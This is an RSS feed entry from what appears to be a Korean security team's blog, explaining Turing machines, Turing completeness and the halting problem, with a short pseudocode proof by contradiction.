      <guid>https://hackyboiz.github.io/2021/09/15/y00n_nms/turing-machine/</guid>
      <pubDate>Wed, 15 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC568;&amp;#xB7F0; &amp;#xD29C;&amp;#xB9C1;&amp;#xC758; &amp;#xC5D0;&amp;#xB2C8;&amp;#xADF8;&amp;#xB9C8; &amp;#xC554;&amp;#xD638; &amp;#xD574;&amp;#xB3C5;&amp;#xC744; &amp;#xB2F4;&amp;#xC740; &amp;#x</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC568;&#xB7F0; &#xD29C;&#xB9C1;&#xC758; &#xC5D0;&#xB2C8;&#xADF8;&#xB9C8; &#xC554;&#xD638; &#xD574;&#xB3C5;&#xC744; &#xB2F4;&#xC740; &#xC601;&#xD654; &#xC774;&#xBBF8;&#xD14C;&#xC774;&#xC158; &#xAC8C;&#xC784;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xC7A5;&#xBA74;&#xC5D0; &#xB098;&#xC624;&#xB294; &#xAE00;&#xC785;&#xB2C8;&#xB2E4;.</p><blockquote><p>Turing&#x2019;s work inspired generations of research into what scientist calls &#x201C;turing machines&#x201D;. Today, we call them computers.</p></blockquote><p>&#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC740; &#xC568;&#xB7F0; &#xD29C;&#xB9C1;&#xC774; &#xACE0;&#xC548;&#xD55C; &#xAE30;&#xACC4;&#xB85C; &#xD2B9;&#xC815; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD1B5;&#xD574; &#xB367;&#xC148;, &#xBE84;&#xC148;, &#xACF1;&#xC148;&#xC740; &#xBB3C;&#xB860; &#xD604;&#xB300; &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xACC4;&#xC0B0;&#xC740; &#xBAA8;&#xB450; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (&#xB2E4;&#xB9CC; &#xC2DC;&#xAC04;&#xC774; &#xC624;&#xB798; &#xAC78;&#xB9BD;&#xB2C8;&#xB2E4;.)</p><p>&#xD29C;&#xB9C1;-&#xC644;&#xC804;(Turing-Complete)&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC740; &#xC5B4;&#xB5A4; &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC73C;&#xB85C; &#xD560; &#xC218; &#xC788;&#xB294; &#xACC4;&#xC0B0;&#xC744; &#xD560; &#xC218; &#xC788;&#xB2E4;&#xBA74; &#xADF8; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xD29C;&#xB9C1;-&#xC644;&#xC804;&#xD558;&#xB2E4;&#xACE0; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB370;&#xC774;&#xBE44;&#xB4DC; &#xD790;&#xBCA0;&#xB974;&#xD2B8;(David Hilbert)&#xB294; &#x2018;&#xBAA8;&#xB4E0; &#xC218;&#xD559;&#xC801; &#xBB38;&#xC81C;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xADF8; &#xBB38;&#xC81C;&#xAC00; &#xCC38;&#xC778;&#xC9C0; &#xAC70;&#xC9D3;&#xC778;&#xC9C0;&#xB97C; &#xD655;&#xC2E4;&#xD558;&#xAC8C; &#xACB0;&#xC815;&#xD574;&#xC904; &#xBA85;&#xD655;&#xD55C; &#xBC29;&#xBC95;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xC99D;&#xBA85;&#xD558;&#xC2DC;&#xC624;&#x2019; &#xC640; &#xAC19;&#xC740; &#xBB38;&#xC81C;&#xB97C; &#xB0B4;&#xACE0;, &#xC568;&#xB7F0; &#xD29C;&#xB9C1;&#xC740; &#xC774;&#xB97C; &#xC815;&#xC9C0; &#xBB38;&#xC81C;(Halting Problem)&#xB85C; &#xBC1C;&#xC804;&#xC2DC;&#xCF30;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC815;&#xC9C0; &#xBB38;&#xC81C;&#xB780; &#x2018;&#xC8FC;&#xC5B4;&#xC9C4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xD574;&#xACB0;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xB294;&#xC9C0; &#xB9D0;&#xD574;&#xC904; &#xC218; &#xC788;&#xB294; &#xC77C;&#xBC18;&#xD654;&#xB41C; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xAC00;?&#x2019;(&#xC5B4;&#xB5A4; &#xC785;&#xB825; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBC1B;&#xC558;&#xC744; &#xB54C;, &#xC720;&#xD55C;&#xD55C; &#xB2E8;&#xACC4; &#xC774;&#xD6C4;&#xC5D0; &#xB2F5;&#xC774; &#xB098;&#xC62C; &#xAC83;&#xC778;&#xC9C0;, &#xBB34;&#xD55C;&#xB8E8;&#xD504; &#xB4F1;&#xC744; &#xB3CC;&#xBA70; &#xC601;&#xC6D0;&#xD788; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC744; &#xAC83;&#xC778;&#xC9C0;)&#xB77C;&#xB294; &#xBB38;&#xC81C;&#xBA70; &#xC774;&#xB97C; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC73C;&#xB85C; &#xB17C;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC99D;&#xBA85;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/15/y00n_nms/turing-machine/image.png" alt="image"></p><p><strong>&#xADF8;&#xB7FC; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC740; &#xBB34;&#xC5C7;&#xC77C;&#xAE4C;?</strong></p><p>&#xB05D;&#xC5C6;&#xC774; &#xAE34; &#xCE78;&#xC5D0; &#xAE30;&#xD638;&#xB4E4;&#xC774; &#xC801;&#xD600;&#xC788;&#xB294; &#xD14C;&#xC774;&#xD504;(Tape)&#xC640; &#xD14C;&#xC774;&#xD504;&#xC5D0; &#xAE30;&#xB85D;&#xB41C; &#xAE30;&#xD638;&#xB97C; &#xC77D;&#xAC70;&#xB098; &#xC218;&#xC815;&#xD558;&#xB294; &#xC7A5;&#xCE58;(Head), &#xADF8;&#xB9AC;&#xACE0; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC758; &#xC0C1;&#xD0DC;&#xB97C; &#xAE30;&#xB85D;&#xD558;&#xB294; &#xC0C1;&#xD0DC; &#xAE30;&#xB85D;&#xAE30;(State register), &#xAE30;&#xACC4;&#xC758; &#xC791;&#xB3D9; &#xADDC;&#xCE59;&#xD45C;(Action Table)&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC791;&#xB3D9; &#xADDC;&#xCE59;&#xD45C;&#xC758; &#xC608;&#xB97C; &#xB4E4;&#xBA74; &#x2018;&#xD604;&#xC7AC; &#xC0C1;&#xD0DC;&#xAC00; &#x2018;A&#x2019;&#xC77C; &#xB54C; &#xD14C;&#xC774;&#xD504;&#xC5D0;&#xC11C; &#x2018;1&#x2019;&#xC744; &#xB9CC;&#xB098;&#xBA74; &#x2018;P&#x2019;&#xB97C; &#xC4F0;&#xACE0; &#xC624;&#xB978;&#xCABD;&#xC73C;&#xB85C; &#xD55C; &#xCE78; &#xC774;&#xB3D9;&#xD558;&#xACE0; &#xC0C1;&#xD0DC;&#xB97C; &#x2018;B&#x2019;&#xB85C; &#xC218;&#xC815;&#x2019;, &#x2018;&#xD604;&#xC7AC; &#xC0C1;&#xD0DC;&#xAC00; &#x2018;C&#x2019;&#xC77C; &#xB54C; &#xD14C;&#xC774;&#xD504;&#xC5D0;&#xC11C; &#x2018;1&#x2019;&#xC744; &#xB9CC;&#xB098;&#xBA74; &#x2018;P&#x2019;&#xB97C; &#xC4F0;&#xACE0; &#xC624;&#xB978;&#xCABD;&#xC73C;&#xB85C; &#xD55C; &#xCE78; &#xC774;&#xB3D9;&#xD558;&#xACE0; &#xC0C1;&#xD0DC;&#xB97C; &#x2018;HALT&#x2019;(&#xC815;&#xC9C0;)&#xC73C;&#xB85C; &#xC218;&#xC815;&#xACFC; &#xAC19;&#xC740; &#xADDC;&#xCE59;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC791;&#xB3D9; &#xADDC;&#xCE59;&#xC5D0; &#xB530;&#xB77C; &#xD14C;&#xC774;&#xD504; &#xCE78;&#xC758; &#xAE30;&#xD638;&#xB97C; &#xC77D;&#xACE0; &#xC218;&#xC815;&#xD558;&#xBA70; &#xC88C;&#xC6B0;&#xB85C; &#xC6C0;&#xC9C1;&#xC774;&#xBA74;&#xC11C; &#xAE30;&#xACC4;&#xC758; &#xC0C1;&#xD0DC;&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC804;&#xBD80;&#xC774;&#xBA70;, &#xC774;&#xB7EC;&#xD55C; &#xACFC;&#xC815;&#xC73C;&#xB85C; &#xACB0;&#xACFC;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD55C; &#xAE30;&#xACC4;&#xAC00; &#xB367;&#xC148;&#xB9CC; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xBA74;, Universal Computing Machine&#xC740; &#xBAA8;&#xB4E0; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC774; &#xD560; &#xC218; &#xC788;&#xB294; &#xACC4;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC; &#xB2E4;&#xC2DC;, &#xC815;&#xC9C0; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xADC0;&#xB958;&#xBC95;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC774; &#xC815;&#xC9C0;&#xD560;&#xC9C0; &#xC548; &#xD560;&#xC9C0;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xC5EC; &#xD310;&#xBCC4;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC774;&#xAC83;&#xC744; &#xD310;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xB294; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC774; &#xC788;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xC815;&#xC9C0; &#xBB38;&#xC81C; &#xD310;&#xBCC4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; <code>exit(a, i)</code> &#xD568;&#xC218;&#xB97C; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0; a&#xAC00; &#xC785;&#xB825; i&#xC5D0; &#xB300;&#xD574; &#xC815;&#xC9C0;&#xD558;&#xACE0; &#xACB0;&#xACFC;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xBA74; true, &#xC544;&#xB2C8;&#xB77C;&#xBA74; false&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xC989; a(i)&#xAC00; &#xBB34;&#xD55C;&#xB8E8;&#xD504;&#xC5D0; &#xBE60;&#xC9C4;&#xB2E4;&#xBA74; <code>exit(a, i)==false</code>&#xC785;&#xB2C8;&#xB2E4;.</p><p>exit&#xB97C; &#xBAA8;&#xC21C; &#xC2DC;&#xD0A4;&#xB294; <code>subroutine()</code> &#xD568;&#xC218;&#xB97C; &#xC815;&#xC758;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>exit(s,s)</code>&#xB294; &#xC790;&#xAE30; &#xC790;&#xC2E0;&#xC744; &#xC785;&#xB825;&#xC73C;&#xB85C; &#xB123;&#xACE0; &#xC2E4;&#xD589;&#xD560; &#xB54C; &#xACB0;&#xACFC;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB294;&#xC9C0;&#xB97C; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">function subroutine(s){<span class="hljs-keyword">if</span> exit(s,s) == false<span class="hljs-keyword">return</span> true<span class="hljs-keyword">else</span>infinite loop}</code></pre><p>true&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; infinite loop&#xC5D0; &#xC758;&#xD574; &#xBB34;&#xD55C;&#xB8E8;&#xD504;&#xB97C; &#xD558;&#xBBC0;&#xB85C; &#xCC38;&#xC77C; &#xC218;&#xAC00; &#xC5C6;&#xC73C;&#xBA70;, false&#xC774;&#xBA74; true&#xB97C; &#xBC18;&#xD658;&#xD558;&#xBBC0;&#xB85C; &#xAC70;&#xC9D3;&#xC77C; &#xC218;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBCF5;&#xC7A1;&#xD574; &#xBCF4;&#xC774;&#xC9C0;&#xB9CC; &#xC774;&#xB294; &#xB9C8;&#xCE58; &#x2018;&#xC774; &#xBB38;&#xC7A5;&#xC740; &#xAC70;&#xC9D3;&#xB9D0;&#xC774;&#xB2E4;&#x2019; &#xB77C;&#xB294; &#xBB38;&#xC7A5;&#xC774; &#xCC38;&#xC77C;&#xC9C0;, &#xAC70;&#xC9D3;&#xC77C;&#xC9C0; &#xD310;&#xB2E8;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xBE44;&#xC2B7;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBAA8;&#xC21C;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC5EC; &#xACB0;&#xAD6D; &#xC815;&#xC9C0; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD560; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC774; &#xBAA8;&#xC21C;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xADF8;&#xB7F0; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xB294; &#xACB0;&#xB860;&#xC774; &#xB098;&#xC624;&#xBA70; &#xD29C;&#xB9C1;&#xBA38;&#xC2E0;&#xC740; &#xC0AC;&#xC2E4;&#xC0C1; &#x2018;&#xACC4;&#xC0B0;&#x2019;&#xC774;&#xB77C;&#xB294; &#xAC83;&#xC758; &#xD55C;&#xACC4;&#xB97C; &#xBC1D;&#xD614;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://www.udiprod.com/halting-problem/#faq">&#xC815;&#xC9C0; &#xBB38;&#xC81C;&#xC5D0; &#xB300;&#xD574; &#xAC00;&#xC7A5; &#xC27D;&#xAC8C; &#xC54C;&#xB824;&#xC8FC;&#xB294; &#xC601;&#xC0C1;&#xACFC; &#xC0AC;&#xB78C;&#xB4E4;&#xC774; &#xB0A8;&#xAE34; &#xC9C8;&#xBB38;&#xC5D0; &#xB300;&#xD55C; &#xB2F5;</a>&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xD574;&#xD558;&#xB294;&#xB370; &#xC5B4;&#xB824;&#xC6C0;&#xC774; &#xC788;&#xB2E4;&#xBA74; &#xBCF4;&#xC2DC;&#xAE30;&#xB97C; &#xCD94;&#xCC9C;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
      
      <category domain="https://hackyboiz.github.io/tags/turing-machine/">turing machine</category>
      
      <category domain="https://hackyboiz.github.io/tags/alan-turing/">alan turing</category>
      
      <category domain="https://hackyboiz.github.io/tags/halt-problem/">halt problem</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/15/y00n_nms/turing-machine/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
